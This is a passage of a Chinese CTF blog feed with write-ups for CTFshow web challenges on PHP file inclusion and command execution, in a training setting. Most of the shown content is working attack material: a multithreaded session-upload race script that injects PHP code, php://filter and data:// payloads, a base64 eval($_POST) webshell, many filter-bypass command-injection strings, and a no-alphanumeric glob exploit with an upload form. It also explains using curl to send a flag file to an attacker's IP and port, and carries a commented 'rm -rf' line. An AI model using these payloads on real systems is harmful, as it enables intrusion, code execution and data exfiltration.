class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了冒号，日志包含依然可行</p>        <h5 id="82"   >          <a href="#82" class="heading-link"><i class="fas fa-link"></i></a><a href="#82" class="headerlink" title="82"></a>82</h5>      <p>过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入</p><pre class="line-numbers language-none"><code class="language-none">原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在&#x2F;tmp&#x2F;sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含&#x2F;tmp&#x2F;sess_name文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h5 id="83-86"   >          <a href="#83-86" class="heading-link"><i class="fas fa-link"></i></a><a href="#83-86" class="headerlink" title="83-86"></a>83-86</h5>      <pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 竞争万能脚本：# os.system(&#39;rm -rf &#x2F;bin&#x2F;Azuki&#39;)# 消灭Azuki保平安import ioimport requestsimport threadingsessID &#x3D; &#39;flag&#39;url &#x3D; &#39;http:&#x2F;&#x2F;193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show&#x2F;&#39;def write(session):    while event.isSet():        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)        response &#x3D; session.post(            url,            cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessID&#125;,            data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#39;&#125;,            files&#x3D;&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;        )def read(session):    while event.isSet():        response &#x3D; session.get(url + &#39;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;&#125;&#39;.format(sessID))        if &#39;test&#39; in response.text:            print(response.text)            event.clear()        else:            print(&#39;[*]retrying...&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    event &#x3D; threading.Event()    event.set()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()        for i in range(1, 30):            threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>87</strong></p><p>先贴一个<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" >文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>对于php://filter的使用</p><p>简单版本：使用rot13编解码绕过</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php（记得进行两次URL编码）POST:pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?php system(&#39;tac f*.php&#39;);?&gt;经过rot13编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>复杂版本：使用base64编解码绕过</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php（记得进行两次URL编码）POST:pbagrag&#x3D;&lt;?cuc flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?php system(&#39;tac f*.php&#39;);?&gt;经过rot13编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0<del>9,a</del>z,A~Z），比如题中的<code>&lt;?php die(&quot;大佬别秀了&quot;);?&gt;</code>，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了</p><p><strong>88</strong></p><p>构造语句使得base64编码后只含数字和字母即可</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7&#x2F;&#x2F;&lt;?php   eval($_POST[1]);POST:1&#x3D;system(&#39;tac f*&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow命令执行</title>
      <link href="/posts/47520.html"/>
      <url>/posts/47520.html</url>
      
        <content type="html"><![CDATA[        <h1 id="命令执行"   >          <a href="#命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1>      <p>危险函数：</p><pre class="line-numbers language-none"><code class="language-none">------------------------------------------------执行(系统)函数 eval exec - 执行一个外部程序 shell_exec system passthru proc_open pcntl_exec — 在当前进程空间执行指定程序 pcntl_fork  在当前进程当前位置产生分支（子进程）。 dl — 运行时载入一个 PHP 扩展 unserialize - 反序列化一个类函数nashell ------------------------------------------------显示源码    phpinfo readfile readline show_source heighlight heighlight_string curl php   curl -f filename&#x3D;@&#x2F;flag [要传到的ip地址和端口] 解释：在linux里面单引号里面的的命令会直接先执行 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping  命令了只要监听此端口拿到文件即可 file  ------------------------------------------------回调函数 array_walk array_walk_recursive array_map call_user_func_array call_user_func ------------------------------------------------数组使用回调函数过滤 array_filter filter_var filter_var_array ------------------------------------------------写入文件 fopen fwrite file_put_contents - 将数据写入文件中 file-get-contents - 获取参数的文件资源 move_uploaded_file - 将上传的文件移动到新位置 ------------------------------------------------命令字符串转义 escapeshellcmd - 对特殊字符转义 escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数 ------------------------------------------------其他 proc_terminate — 杀除由 proc_open 打开的进程 touch - 设定文件的访问和修改时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可用于执行php函数的函数：</p><pre class="line-numbers language-none"><code class="language-none">eval()、assert()、preg_replace(&quot;&#x2F;test&#x2F;e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;)&#x2F;&#x2F;正则规则中含有&#x2F;e修饰符就存在代码执行漏洞create_function()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可用于执行系统命令的函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回命令执行结果，加echo</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//执行后直接显示结果</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//返回命令执行结果，加echo</span><span class="token string backtick-quoted-string">`命令`</span><span class="token comment">//返回命令执行结果，加echo</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><p>可用于替代空格的字符：</p><pre class="line-numbers language-none"><code class="language-none">%09、$IFS$9、 $&#123;IFS&#125;、$IFS%09、&lt; 、&lt;&gt;、%20等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可用于读取文件的命令：</p><pre class="line-numbers language-none"><code class="language-none">cattacheadmorelesscutnlls &#x2F; | tee 1.txt将ls后的结果写入1.txt中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通配符：</p><pre class="line-numbers language-none"><code class="language-none">*代表任意位?代表一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>取反绕过</strong></p><p>原理：php字符串取反之后可绕过正则</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//%8F%97%8F%96%91%99%90</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时传入<code>a=(~%8F%97%8F%96%91%99%90)();</code></p><p>即可执行phpinfo函数</p><p>对于PHP，形如 <code>(func_name)()</code>，其中func_name可以是字符串，会执行这个func</p><p>但是如果只传入<code>(~%8F%97%8F%96%91%99%90%D7%D6)</code>内容为<code>phpinfo()</code>，会发现此时函数不会被执行，此时php取反取得了phpinfo，但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></p><p>所以如果我们想执行shell，是不能单传入一个<code>$_POST[&#39;kkk&#39;]</code>的取反来执行的，而是需要使用嵌套执行的方式，形如<code>assert($_POST[kkk])</code>传入<code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)</code>再传入命令kkk来执行</p><p><strong>很恶心的命令执行</strong></p><pre class="line-numbers language-none"><code class="language-none">NKCTF&#x3D;$_&#x3D;(_&#x2F;_._)[_];$__&#x3D;++$_;$__&#x3D;_.++$_.$__;$_++;$_++;$__.&#x3D;++$_.++$_;$_&#x3D;++$___;$_++;$$__[$___]($$__[$_]);&amp;1&#x3D;highlight_file&amp;2&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h5 id="29"   >          <a href="#29" class="heading-link"><i class="fas fa-link"></i></a><a href="#29" class="headerlink" title="29"></a>29</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，`内部为执行的命令，通过echo得到返回值`</p>        <h5 id="30"   >          <a href="#30" class="heading-link"><i class="fas fa-link"></i></a><a href="#30" class="headerlink" title="30"></a>30</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;cat%20f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php，同上</p>        <h5 id="31"   >          <a href="#31" class="heading-link"><i class="fas fa-link"></i></a><a href="#31" class="headerlink" title="31"></a>31</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;echo(&#96;tac%09f*&#96;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可</p>        <h5 id="32"   >          <a href="#32" class="heading-link"><i class="fas fa-link"></i></a><a href="#32" class="headerlink" title="32"></a>32</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数<code>include()</code>，include可以实现无括号包含，进而通过<code>?&gt;</code>将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容</p>        <h5 id="33"   >          <a href="#33" class="heading-link"><i class="fas fa-link"></i></a><a href="#33" class="headerlink" title="33"></a>33</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上</p>        <h5 id="34"   >          <a href="#34" class="heading-link"><i class="fas fa-link"></i></a><a href="#34" class="headerlink" title="34"></a>34</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上</p>        <h5 id="35"   >          <a href="#35" class="heading-link"><i class="fas fa-link"></i></a><a href="#35" class="headerlink" title="35"></a>35</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上</p>        <h5 id="36"   >          <a href="#36" class="heading-link"><i class="fas fa-link"></i></a><a href="#36" class="headerlink" title="36"></a>36</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;include%09$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可</p>        <h5 id="37"   >          <a href="#37" class="heading-link"><i class="fas fa-link"></i></a><a href="#37" class="headerlink" title="37"></a>37</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;php:&#x2F;&#x2F;input请求体:&lt;?php include &quot;flag.php&quot;?&gt;或payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>include函数开始，过滤了flag，通过php://input伪协议直接包含文件</p>        <h5 id="38"   >          <a href="#38" class="heading-link"><i class="fas fa-link"></i></a><a href="#38" class="headerlink" title="38"></a>38</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>过滤了flag, php,file，通过data伪协议执行include “flag.php”</p>        <h5 id="39"   >          <a href="#39" class="heading-link"><i class="fas fa-link"></i></a><a href="#39" class="headerlink" title="39"></a>39</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fla*.php&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响</p>        <h5 id="40"   >          <a href="#40" class="heading-link"><i class="fas fa-link"></i></a><a href="#40" class="headerlink" title="40"></a>40</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;eval(array_pop(next(get_defined_vars())));POST:a&#x3D;system(&#39;cat flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>print_r(get_defined_vars());可以拿到所有已经定义的变量并取得值</p><p>next(变量)可以获得下一个变量</p><p>array_pop(数组)弹出数组中的变量为单个独立变量</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;session_start();system(session_id());passid&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>本地修改sessionID传入命令</p>        <h5 id="41"   >          <a href="#41" class="heading-link"><i class="fas fa-link"></i></a><a href="#41" class="headerlink" title="41"></a>41</h5>      <pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以发现大多数自负都被过滤，查看提示</p><p>通过脚本可获取异或（｜）后能得到的所有字符</p><p>直接使用脚本</p>        <h5 id="42"   >          <a href="#42" class="heading-link"><i class="fas fa-link"></i></a><a href="#42" class="headerlink" title="42"></a>42</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;cat flag.php;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>$c.” &gt;/dev/null 2&gt;&amp;1”</p><p>题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示</p>        <h5 id="43"   >          <a href="#43" class="heading-link"><i class="fas fa-link"></i></a><a href="#43" class="headerlink" title="43"></a>43</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20flag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了cat和分号，通过&amp;&amp;也可进行多命令执行，要进行URL编码</p>        <h5 id="44"   >          <a href="#44" class="heading-link"><i class="fas fa-link"></i></a><a href="#44" class="headerlink" title="44"></a>44</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%20fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了flag，使用通配符</p>        <h5 id="45"   >          <a href="#45" class="heading-link"><i class="fas fa-link"></i></a><a href="#45" class="headerlink" title="45"></a>45</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac$&#123;IFS&#125;fla*.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了空格，找个能替代的就行</p>        <h5 id="46"   >          <a href="#46" class="heading-link"><i class="fas fa-link"></i></a><a href="#46" class="headerlink" title="46"></a>46</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了*和$，使用%09（制表符）替代空格</p>        <h5 id="47"   >          <a href="#47" class="heading-link"><i class="fas fa-link"></i></a><a href="#47" class="headerlink" title="47"></a>47</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了一些读取文件的命令，但没滤tac，直接用</p>        <h5 id="48"   >          <a href="#48" class="heading-link"><i class="fas fa-link"></i></a><a href="#48" class="headerlink" title="48"></a>48</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了数字和空格</p>        <h5 id="49"   >          <a href="#49" class="heading-link"><i class="fas fa-link"></i></a><a href="#49" class="headerlink" title="49"></a>49</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上题，过滤了水平制表符和&amp;&amp;符，将&amp;更换为｜也可以多命令执行</p>        <h5 id="50"   >          <a href="#50" class="heading-link"><i class="fas fa-link"></i></a><a href="#50" class="headerlink" title="50"></a>50</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h5 id="51"   >          <a href="#51" class="heading-link"><i class="fas fa-link"></i></a><a href="#51" class="headerlink" title="51"></a>51</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>滤了tac呜呜呜呜用nl</p>        <h5 id="52"   >          <a href="#52" class="heading-link"><i class="fas fa-link"></i></a><a href="#52" class="headerlink" title="52"></a>52</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl%27%27ag||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>滤掉了尖括号但是$回来了</p><p><code>nl$&#123;IFS&#125;fla%27%27g.php||</code></p><p>但是明显flag不对，所以看一下根目录<code>ls$&#123;IFS&#125;/</code>发现flag存在</p><p>使用nl读取</p>        <h5 id="53"   >          <a href="#53" class="heading-link"><i class="fas fa-link"></i></a><a href="#53" class="headerlink" title="53"></a>53</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;ta%27%27c$&#123;IFS&#125;fla?.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该题内容不同</p><pre class="line-numbers language-none"><code class="language-none">echo($c);$d &#x3D; system($c);echo &quot;&lt;br&gt;&quot;.$d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac</p>        <h5 id="54"   >          <a href="#54" class="heading-link"><i class="fas fa-link"></i></a><a href="#54" class="headerlink" title="54"></a>54</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:c&#x3D;mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;kkk.txt&#x2F;kkk.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>过滤了单引号绕过，通过mv命令重命名直接读取</p>        <h5 id="55"   >          <a href="#55" class="heading-link"><i class="fas fa-link"></i></a><a href="#55" class="headerlink" title="55"></a>55</h5>      <p>过滤<code>&quot;/\;|[a-z]|\</code>|%|\x09|\x26|&gt;|&lt;/i”</p><p><strong>无字母数字的命令执行</strong></p><p>直接讲原理咯</p><p>.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？</p><p>咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是<code>/tmp/phpXXXXXX</code>(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png"></p><p>列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）</p><p><span class="exturl"><a class="exturl__link"   href="https://man7.org/linux/man-pages/man7/glob.7.html" >https://man7.org/linux/man-pages/man7/glob.7.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>除了使用?和*进行任意匹配，还可以使用<code>[^X]</code>来排除某个字符，这样我们就可以排除前面包含<code>-</code>和<code>.</code>文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法<code>[X-Y]</code>可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于<code>@</code>和<code>[</code>之间，所以构造<code>[@-[]</code>就可以匹配到我们的文件了</p><p>最终payload</p><p>首先构建一个上传文件的html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>当前链接/?c=./???/????????[@-[]<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span 